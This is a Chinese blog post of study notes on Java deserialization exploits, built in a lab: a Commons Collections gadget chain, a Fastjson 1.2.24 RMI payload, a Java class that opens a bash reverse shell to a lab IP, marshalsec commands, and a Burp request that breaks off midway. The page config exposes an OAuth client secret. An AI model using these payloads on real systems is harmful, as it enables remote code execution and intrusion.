<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="xisuansec">
    
    <title>
        
            Java反序列化 |
        
        ~是我呀
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="https://cdn.staticaly.com/gh/xisuansec/picx-images-hosting@master/favicon.3t5ap34gepy0.webp">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"xisuansec.github.io","root":"/","language":"zh-CN"}
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/preview.webp","favicon":"https://cdn.staticaly.com/gh/xisuansec/picx-images-hosting@master/favicon.3t5ap34gepy0.webp","avatar":"https://cdn.staticaly.com/gh/xisuansec/picx-images-hosting@master/preview.1lbmi81cp8u8.webp","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"Lifetime Wandering","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":true},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":"xisuansec","github_admins":null,"repository":"hexo-blog-comments","client_id":"17efb64209824b16935b","client_secret":"2ceab4677a6e6b5ebd72a6d3207a6611b13b7e95","proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["炼气门徒","筑基弟子","金丹砥柱","元婴长老","化神门主","合道老祖","终于大乘"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/preview.webp">
                </a>
            
            <a class="logo-title" href="/">
               ~是我呀
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">Java反序列化</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="https://cdn.staticaly.com/gh/xisuansec/picx-images-hosting@master/preview.1lbmi81cp8u8.webp">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">xisuansec</span>
                            
                                <span class="author-label">Lv1</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-05-03 13:00:56</span>
        <span class="mobile">2023-05-03 13:00</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-05-03 19:17:39</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>5.1k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>21 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <h1 id="1-Java-序列化和反序列化"><a href="#1-Java-序列化和反序列化" class="headerlink" title="1 Java 序列化和反序列化"></a>1 Java 序列化和反序列化</h1><p>序列化：将内存中java对象保存到磁盘或进行网络传输，从数据结构到二进制流（或字符串）<br />反序列化：将磁盘或网络传输中字节流转化为java对象到内存。<br />序列化存在的用途就是为了方便存储、传输。<br /><strong>序列化使用场景</strong>：</p>
<ol>
<li>持久化内存数据</li>
<li>网络传输对象</li>
<li>远程方法调用 RMI</li>
</ol>
<p><strong>Json</strong> 数据格式：可嵌套。支持数组、嵌套数组。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;键名&quot;</span>:<span class="string">&quot;值&quot;</span>,</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>序列化方式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectOutputStream.<span class="title function_ invoke__">writeObject</span>()</span><br></pre></td></tr></table></figure>
<p>反序列化方式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectInputStream.<span class="title function_ invoke__">readObject</span>()</span><br></pre></td></tr></table></figure>
<h1 id="2-Java-反序列化漏洞简介"><a href="#2-Java-反序列化漏洞简介" class="headerlink" title="2 Java 反序列化漏洞简介"></a>2 Java 反序列化漏洞简介</h1><p><strong>原理</strong>：攻击者在应用程序中操纵<strong>可序列化对象</strong>，使其在反序列化时<strong>执行恶意代码</strong>。攻击者可以通过构造特定的序列化数据来进行攻击，从而在反序列化过程中<strong>执行任意代码并取得系统权限</strong>。<br /><strong>注意</strong>：</p>
<ol>
<li>实现Serializable和Externalizable接口的类的对象才能被序列化。</li>
<li>Externalizable接口继承自Serializable接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以采用默认的序列化方式 。</li>
</ol>
<p><strong>利用条件</strong>：</p>
<ol>
<li>有可操纵的对象</li>
<li>目标应用存在可利用的类，如默认实现了反序列化的类，重写了readObject() 并存在敏感操作的类</li>
</ol>
<p><strong>重写了readObject()的现成的类：</strong></p>
<ol>
<li>package sun.reflect.annotation;	<code>AnnotationInvocationHandler</code></li>
<li>package javax.management;		<code>BadAttributeValueExpException</code></li>
</ol>
<p>危害：<br />反序列化漏洞一般可以造成RCE，RCE漏洞的危害不用多说吧。执行任意代码取得系统权限，那就是数据泄露、挖矿、后门、跳板机、加密勒索等等。</p>
<h1 id="3-Apache-Commons-Collections-反序列化漏洞"><a href="#3-Apache-Commons-Collections-反序列化漏洞" class="headerlink" title="3 Apache Commons Collections 反序列化漏洞"></a>3 Apache Commons Collections 反序列化漏洞</h1><p>大型Java项目开发的过程中，会用到大量的序列化&#x2F;反序列化以及大量的拓展数据结构以及工具集。而CommonsCollections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念。</p>
<p>环境条件：</p>
<ul>
<li>jdk 1.7.0-80</li>
<li>java-complie 设置为 java7</li>
<li>Apache Commons Collections &lt;&#x3D; 3.2.1</li>
</ul>
<p>Java反射机制：</p>
<blockquote>
<p>在运行状态中：</p>
<ul>
<li>对于任意一个类，都能够判断一个对象所属的类；</li>
<li>对于任意一个类，都能够知道这个类的所有属性和方法；</li>
<li>对于任意一个对象，都能够调用它的任意一个方法和属性；</li>
</ul>
</blockquote>
<p>这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p>
<p>我的问题：不清楚反射机制的使用方式。</p>
<p>Commons Collections中有一个特殊的接口，其中有一个实现该接口的类可以通过调用Java的反射机制来调用任意函数，叫做<strong>InvokerTransformer</strong>。</p>
<p>Apache CC 的漏洞影响范围：Weblogic、Websphere、JBoss、Jenkins、OpenNMS等大型框架。</p>
<h2 id="3-1-CC关键类"><a href="#3-1-CC关键类" class="headerlink" title="3.1 CC关键类"></a>3.1 CC关键类</h2><ul>
<li>InvokeTransformer：利用Java反射机制创建类实例</li>
<li>ChainedTransformer：实现了Transformer的链式调用，我们只要传入一个Transformer数组，ChainedTransformer就可以实现依次调用每一个 Transformer的transform方法</li>
<li>ConstantTransformer：transform()返回构造函数的对象</li>
<li>TransformedMap：存放Transformer对象的Map</li>
</ul>
<h2 id="3-2-利用条件分析"><a href="#3-2-利用条件分析" class="headerlink" title="3.2 利用条件分析"></a>3.2 利用条件分析</h2><ul>
<li>Transformer[]，创建时将入按顺序加入一个ConstantTransformer对象，三个InvokeTransformer对象。</li>
<li>ConstantTransformer，它是Transformer的子类，可加入Transformer数组，它的实例的transformer方法return 实例化时传入的参数，这里就是Runtime.class，所以返回Runtime类。</li>
<li>InvokeTransformer中的transform()方法可以通过反射机制来调用任意函数，这里我们实现三个 InvokeTransformer实例，利用反射机制分别调用getMethod获取getRuntime方法，调用invoke获取一个Runtime对象实例，调用Runtime.exec方法。</li>
<li>ChainedTransformer，用ChainedTransformer封装这个Transformer数组，其transform()方法会调用的Transformer[]中的成员。</li>
<li>TransformedMap，其创建是由已有的Map对象，通过TransformedMap.decorate()方法实现，在decorate的方法中同时插入了ChainedTransformer对象，然后返回一个Map对象。当Map里面的元素被添加、删除、修改的时候，自动调用Map中Transformer对象的transform方法，这里就是调用ChainedTransformer实例的transform方法；</li>
<li>AnnotationInvocationHandler，该类重写了readobject()方法，让攻击者有了利用以上链式调动的可能。该类对象及其构造函数的创建通过反射实现。这里用其构造函数的newInstance()方法创建一个实例并同时引入了前面的Map对象。反序列化时，该实例会调用setValue方法设置其参数Map对象的值，于是就触发了TransfomedMap的transform方法，让整个利用链条活了过来。</li>
</ul>
<p>于是，构造好Transfomer类的调用链条，用ChaindedTransformer封装，塞进TransformedMap，在将Map作为成员变量交给AnnotationInvocationHandler构造函数构造的实例，在反序列化时就可以触发整个利用链了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Reverse_Payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;open /Applications/Calculator.app&quot;</span> &#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, String&gt; innermap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        innermap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outmap</span> <span class="operator">=</span> TransformedMap.decorate(innermap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//通过反射获得AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">//通过反射获得cls的构造函数</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//这里需要设置Accessible为true，否则序列化失败,值为 true 则指示反射的对象在使用时应该取消Java语言访问检查</span></span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//通过newInstance()方法实例化对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Retention.class, outmap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">GeneratePayload</span><span class="params">(Object instance, String file)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//将构造好的payload序列化后写入文件中</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">payloadTest</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//读取写入的payload，并进行反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        GeneratePayload(Reverse_Payload(),<span class="string">&quot;obj&quot;</span>); <span class="comment">//序列化</span></span><br><span class="line">        payloadTest(<span class="string">&quot;obj&quot;</span>); <span class="comment">//反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「Shanfenglan7」的原创文章，遵循CC <span class="number">4.0</span> BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">    原文链接：https:<span class="comment">//blog.csdn.net/qq_41874930/article/details/115720564</span></span><br></pre></td></tr></table></figure>

<h2 id="3-3-反序列化过程"><a href="#3-3-反序列化过程" class="headerlink" title="3.3 反序列化过程"></a>3.3 反序列化过程</h2><ol>
<li>每个序列化数据反序列化时使用的其实例所属类的readObject方法进行反序列化，绝大多数类都没有对readObject()进行重写，而这里AnnotationInvocationHandler对readObject()重写了。</li>
<li>对AnnotationInvocationHandler实例进行反序列化，调用其成员TransformedMap对象的setValue方法，这一个会触发TransformedMap对象的checkSetValue()方法。</li>
<li>TransformedMap对象的checkSetValue方法的调用会触发其成员Transformer对象的transform方法，即ChainedTransformer对象的transform方法，然后就会依次调用Transformer数组中的各个Transformer实例的transform方法，获取Runtime类，获取Runtime类的方法，构建Runtime类的实例，调用Runtime对象的exec()方法。</li>
</ol>
<p>:::success<br>这里整个逻辑链条我都还是能理解，不过因为没有正式接触过Java，Transformer数组中的链式调用时，数据传递不是很明白，是因为都是一个Transformer大类的对象吗，所以前面执行的结果，后面可以获取？<br>:::</p>
<h2 id="3-4-修复"><a href="#3-4-修复" class="headerlink" title="3.4 修复"></a>3.4 修复</h2><p>JDK8后更改了AnnotationInvocationHandler中 readObject的写法，取消了setValue的使用，新 建了LinkedHashMap来储存值。</p>
<h1 id="4-Alibaba-Fastjson-反序列化漏洞"><a href="#4-Alibaba-Fastjson-反序列化漏洞" class="headerlink" title="4 Alibaba Fastjson 反序列化漏洞"></a>4 Alibaba Fastjson 反序列化漏洞</h1><p>复现环境：&lt;1.2.24  &lt;1.2.27，目前最新环境 &gt;1.2.76<br />Alibaba OpenSource: github.com&#x2F;orgs&#x2F;alibaba&#x2F;repositories<br />产品有：Druid、Fastjson、Dubbo、OceanBase、Tengine、TFS、RocketMQ、Canal等</p>
<p>Fastjson 是一个Json工具库，用于将java对象和json数据进行相互转化，也即是序列化和反序列化。</p>
<p><strong>反序列化的两种方法</strong>：</p>
<ul>
<li>JSON.parseObject() 返回实际类型对象（用得多）<ul>
<li>Object obj &#x3D; JSON.parseObject(serializedStr, User.class)<br />这里指定了类名 User.class，后面通过@type可以不用指定类名。</li>
</ul>
</li>
<li>JSON.parse() 返回 JsonObject 对象</li>
</ul>
<p>Fastjson执行序列化时，会调用成员变量的 get 方法，私有成员变量不会被序列化；<br />Fastjson执行反序列化的时候，会调用成员变量的set方法，public成员全部自动赋值。</p>
<p>通过自动映射类型@type即自省机制，可以实现反序列化时不用指定类名。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;wuya.test.User&quot;</span><span class="punctuation">,</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="string">&quot;33&quot;</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;wuya&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<h2 id="4-1-Fastjson漏洞"><a href="#4-1-Fastjson漏洞" class="headerlink" title="4.1 Fastjson漏洞"></a>4.1 Fastjson漏洞</h2><p><strong>原理</strong>：</p>
<ol>
<li>fastjson在对JSON数据进行反序列化时，会读取<code>@type</code>的内容，试图把JSON内容反序列化成<code>@type</code>指定的对象，并且会调用这个对象的Set方法。</li>
<li>利用这个特性，构造一个JSON字符串，使用<code>@type</code>指定我们要使用的攻击类：<ol>
<li><strong>com.sun.rowset.JdbcRowSetImpl</strong>：该类的dataSourceName属性支持传入一个rmi源，解析uri时，会支持rmi远程调用，去指定的rmi地址中去调用方法。</li>
<li><strong>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</strong><blockquote>
<p>rmi：Java远程方法调用(RMI)系统允许在一个Java虚拟机中运行的对象调用在另一个Java虚拟机中运行的对象的方法。RMI提供了用Java编程语言编写的程序之间的远程通信。</p>
</blockquote>
</li>
</ol>
</li>
</ol>
<p>因此，我们搭建一个HTTP服务，将恶意文件放在该HTTP服务的目录下，在POC中指定该恶意文件rmi地址：rmi:&#x2F;&#x2F;192.168.59.128:9437&#x2F;evil_code，那么Fastjson反序列化时就会通过RMI远程下载并调用恶意文件，达成执行任意命令的效果。</p>
<h3 id="4-1-1-Fastjson-1-2-24-RCE-漏洞-（CVE-2017-18349）"><a href="#4-1-1-Fastjson-1-2-24-RCE-漏洞-（CVE-2017-18349）" class="headerlink" title="4.1.1 Fastjson 1.2.24 RCE 漏洞 （CVE-2017-18349）"></a>4.1.1 Fastjson 1.2.24 RCE 漏洞 （CVE-2017-18349）</h3><p><strong>利用条件</strong>：</p>
<ul>
<li>在使用1.2.24版本的Fastjson的网站，使用POST方法发送一个精心构造的JSON字符串。</li>
</ul>
<p><strong>POC反序列化过程分析</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">		<span class="string">&quot;poc&quot;</span>: &#123;</span><br><span class="line">				<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">				<span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://192.168.59.128:9437/LinuxTouch&quot;</span>,</span><br><span class="line">				<span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Fastjson对我们json数据进行反序列化会调用指定类成员变量的set方法（赋值方法），因此反序列化时：</p>
<ol>
<li>识别<code>@type</code>对应的类，将json数据反序列化为该类</li>
<li>调用该类的 setDataSourceName，判断dataSourceName的值，将dateSourceName设置为已经指定的evil_code rmi地址</li>
<li>调用 setAutoCommit，true表示允许自动Commit，然后setAutoCommit会执行一个Connection()方法，该方法又会自动寻找（<code>clx.looup()</code>）getDataSourceName，从而获取rmi地址中指定的Evil_code。</li>
<li>进行连接后，就会下载LinuxTouch并自动执行。</li>
</ol>
<p>使用 Vulnhub 搭建环境。</p>
<ul>
<li>靶场地址：192.168.59.1</li>
<li>攻击机地址：192.168.59.128</li>
</ul>
<p>攻击机（kali） jdk要配置成 JDK8</p>
<ul>
<li>一可以，vim &#x2F;etc&#x2F;profile，修改环境变量</li>
<li>二可以，直接使用JDK8的绝对路径进行编译</li>
</ul>
<p><strong>恶意脚本准备与上传</strong>（kali）：</p>
<ul>
<li><p>JDK版本要和靶场相近，创建LinuxTouch.java，编译LinuxTouch.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinuxRevers</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.142.132/9001 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac LinuxTouch.java</span><br></pre></td></tr></table></figure>
</li>
<li><p>将编译好的LinuxTouch.class文件上传到web服务的根目录下</p>
</li>
<li><p>启动 http 服务器，在哪里启动哪里就是根目录</p>
<ul>
<li>python -m http.server 8089			py3</li>
<li>python -m SimpleHTTPServer 8088	py2</li>
</ul>
</li>
</ul>
<p><strong>LDAP（kali）服务启动</strong>：</p>
<ul>
<li>进入marshalsec的目录，使用JDK8的java开启RMI服务：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SHAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://192.168.59.128:8089/#LinuxTouch&quot;</span> 9473</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>BurpSuite发送Payload</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-gradle">Host: <span class="number">192.168</span>.<span class="number">59.1</span>:<span class="number">8090</span></span></span><br><span class="line"><span class="language-gradle">User-Agent: Mozilla<span class="regexp">/5.0 (X11; Linux x86_64; rv:102.0) Gecko/</span><span class="number">20100101</span> Firefox/<span class="number">102.0</span></span></span><br><span class="line"><span class="language-gradle">Accept: text<span class="regexp">/html,application/</span>xhtml+xml,application<span class="regexp">/xml;q=0.9,image/</span>avif,image<span class="regexp">/webp,*/</span>*;q=<span class="number">0.8</span></span></span><br><span class="line"><span class="language-gradle">Accept-Language: en-US,en;q=<span class="number">0.5</span></span></span><br><span class="line"><span class="language-gradle">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="language-gradle">Connection: keep-alive</span></span><br><span class="line"><span class="language-gradle">Upgrade-Insecure-Requests: <span class="number">1</span></span></span><br><span 